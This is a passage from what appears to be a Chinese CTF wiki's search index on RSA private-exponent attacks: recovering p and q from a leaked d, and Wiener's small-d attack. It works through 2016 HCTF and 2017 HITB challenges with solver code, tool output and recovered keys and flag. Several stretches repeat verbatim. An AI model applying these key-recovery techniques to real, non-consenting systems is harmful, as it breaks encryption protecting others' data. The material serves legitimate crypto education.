\u5176\u4e2d solve \u51fd\u6570\u5c31\u662f\u5bf9\u5e94\u7684 Wiener's Attack \u7684\u51fd\u6570\u3002 \u6211\u4eec\u5f97\u5230\u4e86 u\uff0c\u5982\u4e0b \u279c rsa-wiener-attack git: ( master ) \u2717 python RSAwienerHacker.py Testing Wiener Attack Hacked! ( 'hacked_d = ' , mpz ( 404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L )) ------------------------- Hacked! ( 'hacked_d = ' , mpz ( 404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L )) ------------------------- Hacked! ( 'hacked_d = ' , mpz ( 404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L )) ------------------------- Hacked! ( 'hacked_d = ' , mpz ( 404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L )) ------------------------- Hacked! ( 'hacked_d = ' , mpz ( 404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L )) \u63a5\u7740\u5229\u7528 RsaConverter \u4ee5\u53ca u\uff0ct\uff0cn \u83b7\u53d6\u5bf9\u5e94\u7684 p \u548c q\u3002\u5982\u4e0b 94121F49C0E7A37A60FDE4D13F021675ED91032EB16CB070975A3EECECE8697ED161A27D86BCBC4F45AA6CDC128EB878802E0AD3B95B2961138C8CD04D28471B558CD816279BDCCF8FA1513A444AF364D8FDA8176A4E459B1B939EBEC6BB164F06CDDE9C203C612541E79E8B6C266436AB903209F5C63C8F0DA192F129F0272090CBE1A37E2615EF7DFBB05D8D88B9C964D5A42A7E0D6D0FF344303C4364C894AB7D912065ABC30815A3B8E0232D1B3D7F6B80ED7FE4B71C3477E4D6C2C78D733CF23C694C535DB172D2968483E63CC031DFC5B27792E2235C625EC0CFDE33FD3E53915357772975D264D24A7F31308D72E1BD7656B1C16F58372E7682660381 8220863F1CFDA6EDE52C56B4036485DB53F57A4629F5727EDC4C5637603FE059EB44751FC49EC846C0B8B50966678DFFB1CFEB350EC44B57586A81D35E4887F1722367CE99116092463079A63E3F29D4F4BC416E7728B26248EE8CD2EFEA6925EC6F455DF966CEE13C808BC15CA2A6AAC7FEA69DB7C9EB9786B50EBD437D38B73D44F3687AEB5DF03B6F425CF3171B098AAC6708D534F4D3A9B3D43BAF70316812EF95FC7EBB7E224A7016D7692B52CB0958951BAB4FB5CB1ABB4DAC606F03FA15697CC3E9DF26DE5F6D6EC45A683CD5AAFD58D416969695067795A2CF7899F61669BC7543151AB700A593BF5A1E5C2AFBCE45A08A2A9CC1685FAF1F96B138D1 \u7136\u540e\u6211\u4eec\u76f4\u63a5\u53bb\u83b7\u5f97 d\uff0c\u8fdb\u800c\u5c31\u53ef\u4ee5\u6062\u590d\u660e\u6587 p = 0x94121F49C0E7A37A60FDE4D13F021675ED91032EB16CB070975A3EECECE8697ED161A27D86BCBC4F45AA6CDC128EB878802E0AD3B95B2961138C8CD04D28471B558CD816279BDCCF8FA1513A444AF364D8FDA8176A4E459B1B939EBEC6BB164F06CDDE9C203C612541E79E8B6C266436AB903209F5C63C8F0DA192F129F0272090CBE1A37E2615EF7DFBB05D8D88B9C964D5A42A7E0D6D0FF344303C4364C894AB7D912065ABC30815A3B8E0232D1B3D7F6B80ED7FE4B71C3477E4D6C2C78D733CF23C694C535DB172D2968483E63CC031DFC5B27792E2235C625EC0CFDE33FD3E53915357772975D264D24A7F31308D72E1BD7656B1C16F58372E7682660381 q = 0x8220863F1CFDA6EDE52C56B4036485DB53F57A4629F5727EDC4C5637603FE059EB44751FC49EC846C0B8B50966678DFFB1CFEB350EC44B57586A81D35E4887F1722367CE99116092463079A63E3F29D4F4BC416E7728B26248EE8CD2EFEA6925EC6F455DF966CEE13C808BC15CA2A6AAC7FEA69DB7C9EB9786B50EBD437D38B73D44F3687AEB5DF03B6F425CF3171B098AAC6708D534F4D3A9B3D43BAF70316812EF95FC7EBB7E224A7016D7692B52CB0958951BAB4FB5CB1ABB4DAC606F03FA15697CC3E9DF26DE5F6D6EC45A683CD5AAFD58D416969695067795A2CF7899F61669BC7543151AB700A593BF5A1E5C2AFBCE45A08A2A9CC1685FAF1F96B138D1 if p * q == n : print 'true' phin = ( p - 1 ) * ( q - 1 ) d = gmpy2 . invert ( e , phin ) cipher = 0x2517d1866acc5b7b802a51d6251673262e9e6b2d0e0e14a87b838c2751dee91e4ea29019b0a7877b849fddf9e08580d810622db538462b529412eba9d0f8a450fe1889021c0bbd12a62ccc3fff4627b1dbdebec3a356a066adc03f7650722a34fe41ea0a247cb480a12286fffc799d66b6631a220b8401f5f50daa12943856b35e59abf8457b2269efea14f1535fb95e56398fd5f3ac153e3ea1afd7b0bb5f02832883da46343404eb44594d04bbd254a9a35749af84eaf4e35ba1c5571d41cab4d58befa79b6745d8ecf93b64dd26056a6d1e82430afbff3dbc08d6c974364b57b30c8a8230c99f0ec3168ac4813c4205d9190481282ae14f7b94400caff3786ed35863b66fefcffbef1ad1652221746a5c8da083987b2b69689cf43e86a05ce4cf059934716c455a6410560e41149fbcf5fcea3c210120f106b8f6269b9a954139350626cf4dcb497ce86264e05565ec6c6581bf28c643bb4fab8677148c8034833cedacb32172b0ff21f363ca07de0fa2882ac896954251277adc0cdd0c3bd5a3f107dbebf5f4d884e43fe9b118bdd51dc80607608670507388ae129a71e0005826c7c82efccf9c86c96777d7d3b9b5cce425e3dcf9aec0643f003c851353e36809b9202ff3b79e8f33d40967c1d36f5d585ac9eba73611152fc6d3cf36fd9a60b4c621858ed1f6d4db86054c27828e22357fa3d7c71559d175ff8e8987df flag = gmpy2 . powmod ( cipher , d , n ) print long_to_bytes ( flag ) \u5f97\u5230 flag true hctf { d8e8fca2dc0f896fd7cb4cb0031ba249 }","title":"\u79c1\u94a5 d \u76f8\u5173\u653b\u51fb"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#d","text":"","title":"d \u6cc4\u9732\u653b\u51fb"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#_1","text":"\u9996\u5148\u5f53 d \u6cc4\u9732\u4e4b\u540e\uff0c\u6211\u4eec\u81ea\u7136\u53ef\u4ee5\u89e3\u5bc6\u6240\u6709\u52a0\u5bc6\u7684\u6d88\u606f\u3002\u6211\u4eec\u751a\u81f3\u8fd8\u53ef\u4ee5\u5bf9\u6a21\u6570 N \u8fdb\u884c\u5206\u89e3\u3002\u5176\u57fa\u672c\u539f\u7406\u5982\u4e0b \u6211\u4eec\u77e5\u9053 ed \\equiv 1 \\bmod \\varphi(n) ed \\equiv 1 \\bmod \\varphi(n) \uff0c\u90a3\u4e48 \\varphi(n) | k=ed-1 \\varphi(n) | k=ed-1 \u3002\u663e\u7136 k \u662f\u4e00\u4e2a\u5076\u6570\uff0c\u6211\u4eec\u53ef\u4ee5\u4ee4 k=2^tr k=2^tr \uff0c\u5176\u4e2d r \u4e3a\u5947\u6570\uff0ct \u4e0d\u5c0f\u4e8e 1\u3002\u90a3\u4e48\u5bf9\u4e8e\u4efb\u4f55\u7684\u4e0e N \u4e92\u7d20\u7684\u6570 g\uff0c\u6211\u4eec\u90fd\u6709 g^k \\equiv 1 \\bmod n g^k \\equiv 1 \\bmod n \u3002\u90a3\u4e48 z=g^{\\frac{k}{2}} z=g^{\\frac{k}{2}} \u662f\u6a21 N \u7684\u4e8c\u6b21\u65b9\u6839\u3002\u90a3\u4e48\u6211\u4eec\u6709 z^2 \\equiv 1 \\bmod p \\\\ z^2 \\equiv 1 \\bmod q z^2 \\equiv 1 \\bmod p \\\\ z^2 \\equiv 1 \\bmod q \u8fdb\u800c\u6211\u4eec\u6211\u4eec\u77e5\u9053\u65b9\u7a0b\u6709\u4ee5\u4e0b\u56db\u4e2a\u89e3\uff0c\u524d\u4e24\u4e2a\u662f x \\equiv \\pm1 \\bmod N x \\equiv \\pm1 \\bmod N \u540e\u4e24\u4e2a\u662f \\pm x \\pm x \uff0c\u5176\u4e2d x \u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6 x \\equiv 1 \\bmod p \\\\ x \\equiv -1 \\bmod q x \\equiv 1 \\bmod p \\\\ x \\equiv -1 \\bmod q \u663e\u7136\uff0c z=g^{\\frac{k}{2}} z=g^{\\frac{k}{2}} \u6ee1\u8db3\u7684\u662f\u540e\u9762\u90a3\u4e2a\u6761\u4ef6\uff0c\u6211\u4eec\u53ef\u4ee5\u8ba1\u7b97 gcd(z-1,N) gcd(z-1,N) \u6765\u5bf9 N \u8fdb\u884c\u5206\u89e3\u3002","title":"\u653b\u51fb\u539f\u7406"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#_2","text":"\u5229\u7528\u4ee5\u4e0b\u5de5\u5177\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u8ba1\u7b97 RsaConverter.exe ( https://sourceforge.net/projects/rsaconverter/ , for windows ) rsatool.py","title":"\u5de5\u5177"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#2017-hitb-hack-in-the-card-ii","text":"The second smart card sent to us has been added some countermeasures by that evil company. They also changed the public key(attachments -> publickey.pem). However it seems that they missed something...... Can you decrypt the following hex-encoded ciphertext this time? 016d1d26a470fad51d52e5f3e90075ab77df69d2fb39905fe634ded81d10a5fd10c35e1277035a9efabb66e4d52fd2d1eaa845a93a4e0f1c4a4b70a0509342053728e89e977cfb9920d5150393fe9dcbf86bc63914166546d5ae04d83631594703db59a628de3b945f566bdc5f0ca7bdfa819a0a3d7248286154a6cc5199b99708423d0749d4e67801dff2378561dd3b0f10c8269dbef2630819236e9b0b3d3d8910f7f7afbbed29788e965a732efc05aef3194cd1f1cff97381107f2950c935980e8954f91ed2a653c91015abea2447ee2a3488a49cc9181a3b1d44f198ff9f0141badcae6a9ae45c6c75816836fb5f331c7f2eb784129a142f88b4dc22a0a977 \u8fd9\u9898\u662f\u63a5\u7eed 2017 HITB - hack in the card I \u7684\u4e00\u9053\u9898\uff0c\u6211\u4eec\u76f4\u63a5\u4f7f\u7528 openssl \u67e5\u770b publickey.pem \u7684\u516c\u94a5\uff0c\u53d1\u73b0\u5b83\u7684 N \u4e0e\u4e0a\u4e00\u9053\u9898\u7684 N \u76f8\u540c\uff0c\u5e76\u4e14\u4e0a\u9898\u7684 N\uff0ce\uff0cd \u5df2\u77e5\u3002\u7531\u6b64\u53ef\u76f4\u63a5\u4f7f\u7528\u4e0a\u9762\u7684 rsatool.py \u5f97\u5230 p\uff0cq\uff0c\u5e76\u901a\u8fc7\u672c\u9898\u7684 e \u8ba1\u7b97\u51fa e \u5f97\u5230\u660e\u6587\u3002","title":"2017 HITB - hack in the card II"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#wieners-attack","text":"","title":"Wiener's Attack"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#_3","text":"\u5728 d \u6bd4\u8f83\u5c0f\uff08 d<\\frac{1}{3}N^{\\frac{1}{4}} d<\\frac{1}{3}N^{\\frac{1}{4}} \uff09\u65f6\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528 Wiener's Attack \u6765\u83b7\u5f97\u79c1\u94a5\u3002","title":"\u653b\u51fb\u6761\u4ef6"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#_4","text":"https://en.wikipedia.org/wiki/Wiener%27s_attack https://sagi.io/2016/04/crypto-classics-wieners-rsa-attack/","title":"\u653b\u51fb\u539f\u7406"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#_5","text":"https://github.com/pablocelayes/rsa-wiener-attack","title":"\u5de5\u5177"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#_6","text":"","title":"\u7efc\u5408\u4f8b\u5b50"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#2016-hctf-rsa1","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5 2016 \u5e74 HCTF \u4e2d RSA 1 - Crypto So Interesting \u4e3a\u4f8b\u8fdb\u884c\u5206\u6790\uff0c \u6e90\u4ee3\u7801\u94fe\u63a5 \u3002 \u9996\u5148\u5148\u7ed5\u8fc7\u7a0b\u5e8f\u7684 proof \u90e8\u5206\uff0c\u5dee\u4e0d\u591a\u4f7f\u7528\u4e00\u4e9b\u968f\u673a\u7684\u6570\u636e\u5c31\u53ef\u4ee5\u7ed5\u8fc7\u3002 \u5176\u6b21\uff0c\u6211\u4eec\u6765\u5206\u6790\u4e00\u4e0b\u5177\u4f53\u7684\u4ee3\u7801\u90e8\u5206\uff0c\u7a0b\u5e8f\u662f\u6839\u636e\u6211\u4eec\u7684 token \u6765\u83b7\u53d6 flag \u7684\uff0c\u8fd9\u91cc\u6211\u4eec\u5c31\u76f4\u63a5\u5229\u7528\u6e90\u4ee3\u7801\u4e2d\u63d0\u4f9b\u7684 token\u3002 print \"This is a RSA Decryption System\" print \"Please enter Your team token: \" token = raw_input () try : flag = get_flag ( token ) assert len ( flag ) == 38 except : print \"Token error!\" m_exit ( - 1 ) \u63a5\u4e0b\u6765\u6211\u4eec\u9996\u5148\u77e5\u9053 n=pq n=pq \uff0c\u6211\u4eec\u518d\u6765\u4f60\u4ed4\u7ec6\u5206\u6790\u4e00\u4e0b\u8fd9\u4e2a e\uff0cd \u662f\u5982\u4f55\u5f97\u5230\u7684\u3002 p = getPrime ( 2048 ) q = getPrime ( 2048 ) n = p * q e , d = get_ed ( p , q ) print \"n: \" , hex ( n ) print \"e: \" , hex ( e ) get_ed \u51fd\u6570\u5982\u4e0b def get_ed ( p , q ): k = cal_bit ( q * p ) phi_n = ( p - 1 ) * ( q - 1 ) r = random . randint ( 10 , 99 ) while True : u = getPrime ( k / 4 - r ) if gcd ( u , phi_n ) != 1 : continue t = invmod ( u , phi_n ) e = pi_b ( t ) if gcd ( e , phi_n ) == 1 : break d = invmod ( e , phi_n ) return ( e , d ) \u53ef\u4ee5\u770b\u51fa\uff0c\u6211\u4eec\u5f97\u5230\u7684 u \u7684\u4f4d\u6570\u6bd4 n \u7684\u4f4d\u6570\u7684\u56db\u5206\u4e4b\u4e00\u8fd8\u8981\u5c11\uff0c\u8fd9\u91cc\u5176\u5b9e\u5c31\u5dee\u4e0d\u591a\u6ee1\u8db3\u4e86 Wiener's Attack \u4e86\u3002\u800c\u4e14\u6211\u4eec\u8ba1\u7b97\u51fa\u6765\u7684 u\uff0ct\uff0ce\uff0cd \u8fd8\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6 \\begin{align*} ut &\\equiv 1 \\bmod \\varphi(n) \\\\ et &\\equiv 1 \\bmod bt \\\\ ed &\\equiv 1 \\bmod \\varphi(n) \\end{align*} \\begin{align*} ut &\\equiv 1 \\bmod \\varphi(n) \\\\ et &\\equiv 1 \\bmod bt \\\\ ed &\\equiv 1 \\bmod \\varphi(n) \\end{align*} \u6839\u636e\u9898\u4e2d\u7ed9\u51fa\u7684\u6761\u4ef6\uff0c\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e86 n\uff0ce\uff0cbt\u3002 \u6240\u4ee5\u9996\u5148\u6211\u4eec\u53ef\u4ee5\u6839\u636e\u4e0a\u9762\u7684\u7b2c\u4e8c\u4e2a\u5f0f\u5b50\u77e5\u9053 e\u3002\u8fd9\u65f6\u5019\uff0c\u53ef\u4ee5\u5229\u7528\u7b2c\u4e00\u4e2a\u5f0f\u5b50\u8fdb\u884c Wiener's Attack\uff0c\u83b7\u53d6 u\u3002\u8fdb\u800c\u8fd9\u65f6\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u79c1\u94a5\u6307\u6570\u6cc4\u9732\u653b\u51fb\u7684\u65b9\u6cd5\u6765\u5206\u89e3 N \u4ece\u800c\u5f97\u5230 p\uff0cq\u3002\u8fdb\u800c\u6211\u4eec\u5c31\u53ef\u4ee5\u5f97\u5230 d \u4e86\u3002 \u9996\u5148\u6211\u4eec\u7ed5\u8fc7 proof \u5f97\u5230\u4e86 N\uff0ce\uff0c\u52a0\u5bc6\u540e\u7684 flag \u5982\u4e0b n: 0x4b4403cd5ac8bdfaa3bbf83decdc97db1fbc7615fd52f67a8acf7588945cd8c3627211ffd3964d979cb1ab3850348a453153710337c6fe3baa15d986c87fca1c97c6d270335b8a7ecae81ae0ebde48aa957e7102ce3e679423f29775eef5935006e8bc4098a52a168e07b75e431a796e3dcd29c98dab6971d3eac5b5b19fb4d2b32f8702ef97d92da547da2e22387f7555531af4327392ef9c82227c5a2479623dde06b525969e9480a39015a3ed57828162ca67e6d41fb7e79e1b25e56f1cff487c1d0e0363dc105512d75c83ad0085b75ede688611d489c1c2ea003c3b2f81722cdb307a3647f2da01fb3ba0918cc1ab88c67e1b6467775fa412de7be0b44f2e19036471b618db1415f6b656701f692c5e841d2f58da7fd2bc33e7c3c55fcb8fd980c9e459a6df44b0ef70b4b1d813a57530446aa054cbfb9d1a86ffb6074b6b7398a83b5f0543b910dcb9f111096b07a98830a3ce6da47cd36b7c1ac1b2104ea60dc198c34f1c50faa5b697f2f195afe8af5d455e8ac7ca6eda669a5a1e3bfbd290a4480376abd1ff21298d529b26a4e614ab24c776a10f5f5d8e8809467a3e81f04cf5d5b23eb4a3412886797cab4b3c5724c077354b2d11d19ae4e301cd2ca743e56456d2a785b650c7e1a727b1bd881ee85c8d109792393cc1a92a66b0bc23b164146548f4e184b10c80ec458b776df10405b65399e32d657bc83e1451 e: 0x10194521505692a64d043daaef7647e0efb1503ec89220a0e4148ab53ecf708146a8893a2e700e4f2f062be14a3ab4e46339a939d5c7289904cc0ab043320d3a4d7da868bf5736ae5f787d6c0e3d9b8cc4b81314ad6c5ff643bc0d8946fea7eb09bf707a54747a39df1cfc0c30849770578cb63de86621001ce86a11874c91419a4d07373e66e94f31b988cac3aeaff88c7abaf3b78468a434990f7854e734208a7461f8245660fa8301f979e85517d705302c797dbdf2938cc442b01c228939eb73aa29651a198a332af2bb982310699684e5a0595c7413ec01eefb3613a9ea4b59f1de984ad4bf6654960613c0f8104b4e41fb33384e07f715176d68f4bb7613b1258675e70dc774f701aee053830f0be28ba9f308c9fe1707a5ba07a2027d74144b8aeb4042df3c1d73d9c38c2d7d1a890fd70d6e38c72da5d075f3811c0354dcecdd836a59112a70be22757278c5e4973906aaeeadd6f61d0845d6f9761df191b0b2527d122dd07f8bd07f5cd14268246ac2b93b778c84b5157f7eb23a8eaa9f0f885f2a38e3fb8fd1012d9b6c841cea8d9d73b232bef298afd086c1063bdd11e0777c8d2ec91ae843a67a98039cb53fad0ee25040176841a017fabf79b98de21d40bc6985f82dd84406aad26e9ac9bc5f6e12385230d9620b888c201ca9c413cbf0f36b100a6c62c5c8f065934fcf9f9f0179eea35888cb357b704441c1 flag: 0x2517d1866acc5b7b802a51d6251673262e9e6b2d0e0e14a87b838c2751dee91e4ea29019b0a7877b849fddf9e08580d810622db538462b529412eba9d0f8a450fe1889021c0bbd12a62ccc3fff4627b1dbdebec3a356a066adc03f7650722a34fe41ea0a247cb480a12286fffc799d66b6631a220b8401f5f50daa12943856b35e59abf8457b2269efea14f1535fb95e56398fd5f3ac153e3ea1afd7b0bb5f02832883da46343404eb44594d04bbd254a9a35749af84eaf4e35ba1c5571d41cab4d58befa79b6745d8ecf93b64dd26056a6d1e82430afbff3dbc08d6c974364b57b30c8a8230c99f0ec3168ac4813c4205d9190481282ae14f7b94400caff3786ed35863b66fefcffbef1ad1652221746a5c8da083987b2b69689cf43e86a05ce4cf059934716c455a6410560e41149fbcf5fcea3c210120f106b8f6269b9a954139350626cf4dcb497ce86264e05565ec6c6581bf28c643bb4fab8677148c8034833cedacb32172b0ff21f363ca07de0fa2882ac896954251277adc0cdd0c3bd5a3f107dbebf5f4d884e43fe9b118bdd51dc80607608670507388ae129a71e0005826c7c82efccf9c86c96777d7d3b9b5cce425e3dcf9aec0643f003c851353e36809b9202ff3b79e8f33d40967c1d36f5d585ac9eba73611152fc6d3cf36fd9a60b4c621858ed1f6d4db86054c27828e22357fa3d7c71559d175ff8e8987df \u5176\u6b21\u4f7f\u7528\u5982\u4e0b\u65b9\u6cd5\u8fdb\u884c Wiener's Attack \u5f97\u5230 u\uff0c\u5982\u4e0b if __name__ == \"__main__\" : bt = 536380958350616057242691418634880594502192106332317228051967064327642091297687630174183636288378234177476435270519631690543765125295554448698898712393467267006465045949611180821007306678935181142803069337672948471202242891010188677287454504933695082327796243976863378333980923047411230913909715527759877351702062345876337256220760223926254773346698839492268265110546383782370744599490250832085044856878026833181982756791595730336514399767134613980006467147592898197961789187070786602534602178082726728869941829230655559180178594489856595304902790182697751195581218334712892008282605180395912026326384913562290014629187579128041030500771670510157597682826798117937852656884106597180126028398398087318119586692935386069677459788971114075941533740462978961436933215446347246886948166247617422293043364968298176007659058279518552847235689217185712791081965260495815179909242072310545078116020998113413517429654328367707069941427368374644442366092232916196726067387582032505389946398237261580350780769275427857010543262176468343294217258086275244086292475394366278211528621216522312552812343261375050388129743012932727654986046774759567950981007877856194574274373776538888953502272879816420369255752871177234736347325263320696917012616273L e = 0x10194521505692a64d043daaef7647e0efb1503ec89220a0e4148ab53ecf708146a8893a2e700e4f2f062be14a3ab4e46339a939d5c7289904cc0ab043320d3a4d7da868bf5736ae5f787d6c0e3d9b8cc4b81314ad6c5ff643bc0d8946fea7eb09bf707a54747a39df1cfc0c30849770578cb63de86621001ce86a11874c91419a4d07373e66e94f31b988cac3aeaff88c7abaf3b78468a434990f7854e734208a7461f8245660fa8301f979e85517d705302c797dbdf2938cc442b01c228939eb73aa29651a198a332af2bb982310699684e5a0595c7413ec01eefb3613a9ea4b59f1de984ad4bf6654960613c0f8104b4e41fb33384e07f715176d68f4bb7613b1258675e70dc774f701aee053830f0be28ba9f308c9fe1707a5ba07a2027d74144b8aeb4042df3c1d73d9c38c2d7d1a890fd70d6e38c72da5d075f3811c0354dcecdd836a59112a70be22757278c5e4973906aaeeadd6f61d0845d6f9761df191b0b2527d122dd07f8bd07f5cd14268246ac2b93b778c84b5157f7eb23a8eaa9f0f885f2a38e3fb8fd1012d9b6c841cea8d9d73b232bef298afd086c1063bdd11e0777c8d2ec91ae843a67a98039cb53fad0ee25040176841a017fabf79b98de21d40bc6985f82dd84406aad26e9ac9bc5f6e12385230d9620b888c201ca9c413cbf0f36b100a6c62c5c8f065934fcf9f9f0179eea35888cb357b704441c1 t = gmpy2 . invert ( e , bt ) n = 0x4b4403cd5ac8bdfaa3bbf83decdc97db1fbc7615fd52f67a8acf7588945cd8c3627211ffd3964d979cb1ab3850348a453153710337c6fe3baa15d986c87fca1c97c6d270335b8a7ecae81ae0ebde48aa957e7102ce3e679423f29775eef5935006e8bc4098a52a168e07b75e431a796e3dcd29c98dab6971d3eac5b5b19fb4d2b32f8702ef97d92da547da2e22387f7555531af4327392ef9c82227c5a2479623dde06b525969e9480a39015a3ed57828162ca67e6d41fb7e79e1b25e56f1cff487c1d0e0363dc105512d75c83ad0085b75ede688611d489c1c2ea003c3b2f81722cdb307a3647f2da01fb3ba0918cc1ab88c67e1b6467775fa412de7be0b44f2e19036471b618db1415f6b656701f692c5e841d2f58da7fd2bc33e7c3c55fcb8fd980c9e459a6df44b0ef70b4b1d813a57530446aa054cbfb9d1a86ffb6074b6b7398a83b5f0543b910dcb9f111096b07a98830a3ce6da47cd36b7c1ac1b2104ea60dc198c34f1c50faa5b697f2f195afe8af5d455e8ac7ca6eda669a5a1e3bfbd290a4480376abd1ff21298d529b26a4e614ab24c776a10f5f5d8e8809467a3e81f04cf5d5b23eb4a3412886797cab4b3c5724c077354b2d11d19ae4e301cd2ca743e56456d2a785b650c7e1a727b1bd881ee85c8d109792393cc1a92a66b0bc23b164146548f4e184b10c80ec458b776df10405b65399e32d657bc83e1451 solve ( n , t ) \u5176\u4e2d solve \u51fd\u6570\u5c31\u662f\u5bf9\u5e94\u7684 Wiener's Attack \u7684\u51fd\u6570\u3002 \u6211\u4eec\u5f97\u5230\u4e86 u\uff0c\u5982\u4e0b \u279c rsa-wiener-attack git: ( master ) \u2717 python RSAwienerHacker.py Testing Wiener Attack Hacked! ( 'hacked_d = ' , mpz ( 404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L )) ------------------------- Hacked! ( 'hacked_d = ' , mpz ( 404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L )) ------------------------- Hacked! ( 'hacked_d = ' , mpz ( 404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L )) ------------------------- Hacked! ( 'hacked_d = ' , mpz ( 404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L )) ------------------------- Hacked! ( 'hacked_d = ' , mpz ( 404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L )) \u63a5\u7740\u5229\u7528 RsaConverter \u4ee5\u53ca u\uff0ct\uff0cn \u83b7\u53d6\u5bf9\u5e94\u7684 p \u548c q\u3002\u5982\u4e0b 94121F49C0E7A37A60FDE4D13F021675ED91032EB16CB070975A3EECECE8697ED161A27D86BCBC4F45AA6CDC128EB878802E0AD3B95B2961138C8CD04D28471B558CD816279BDCCF8FA1513A444AF364D8FDA8176A4E459B1B939EBEC6BB164F06CDDE9C203C612541E79E8B6C266436AB903209F5C63C8F0DA192F129F0272090CBE1A37E2615EF7DFBB05D8D88B9C964D5A42A7E0D6D0FF344303C4364C894AB7D912065ABC30815A3B8E0232D1B3D7F6B80ED7FE4B71C3477E4D6C2C78D733CF23C694C535DB172D2968483E63CC031DFC5B27792E2235C625EC0CFDE33FD3E53915357772975D264D24A7F31308D72E1BD7656B1C16F58372E7682660381 8220863F1CFDA6EDE52C56B4036485DB53F57A4629F5727EDC4C5637603FE059EB44751FC49EC846C0B8B50966678DFFB1CFEB350EC44B57586A81D35E4887F1722367CE99116092463079A63E3F29D4F4BC416E7728B26248EE8CD2EFEA6925EC6F455DF966CEE13C808BC15CA2A6AAC7FEA69DB7C9EB9786B50EBD437D38B73D44F3687AEB5DF03B6F425CF3171B098AAC6708D534F4D3A9B3D43BAF70316812EF95FC7EBB7E224A7016D7692B52CB0958951BAB4FB5CB1ABB4DAC606F03FA15697CC3E9DF26DE5F6D6EC45A683CD5AAFD58D416969695067795A2CF7899F61669BC7543151AB700A593BF5A1E5C2AFBCE45A08A2A9CC1685FAF1F96B138D1 \u7136\u540e\u6211\u4eec\u76f4\u63a5\u53bb\u83b7\u5f97 d\uff0c\u8fdb\u800c\u5c31\u53ef\u4ee5\u6062\u590d\u660e\u6587 p = 0x94121F49C0E7A37A60FDE4D13F021675ED91032EB16CB070975A3EECECE8697ED161A27D86BCBC4F45AA6CDC128EB878802E0AD3B95B2961138C8CD04D28471B558CD816279BDCCF8FA1513A444AF364D8FDA8176A4E459B1B939EBEC6BB164F06CDDE9C203C612541E79E8B6C266436AB903209F5C63C8F0DA192F129F0272090CBE1A37E2615EF7DFBB05D8D88B9C964D5A42A7E0D6D0FF344303C4364C894AB7D912065ABC30815A3B8E0232D1B3D7F6B80ED7FE4B71C3477E4D6C2C78D733CF23C694C535DB172D2968483E63CC031DFC5B27792E2235C625EC0CFDE33FD3E53915357772975D264D24A7F31308D72E1BD7656B1C16F58372E7682660381 q = 0x8220863F1CFDA6EDE52C56B4036485DB53F57A4629F5727EDC4C5637603FE059EB44751FC49EC846C0B8B50966678DFFB1CFEB350EC44B57586A81D35E4887F1722367CE99116092463079A63E3F29D4F4BC416E7728B26248EE8CD2EFEA6925EC6F455DF966CEE13C808BC15CA2A6AAC7FEA69DB7C9EB9786B50EBD437D38B73D44F3687AEB5DF03B6F425CF3171B098AAC6708D534F4D3A9B3D43BAF70316812EF95FC7EBB7E224A7016D7692B52CB0958951BAB4FB5CB1ABB4DAC606F03FA15697CC3E9DF26DE5F6D6EC45A683CD5AAFD58D416969695067795A2CF7899F61669BC7543151AB700A593BF5A1E5C2AFBCE45A08A2A9CC1685FAF1F96B138D1 if p * q == n : print 'true' phin = ( p - 1 ) * ( q - 1 ) d = gmpy2 . invert ( e , phin ) cipher = 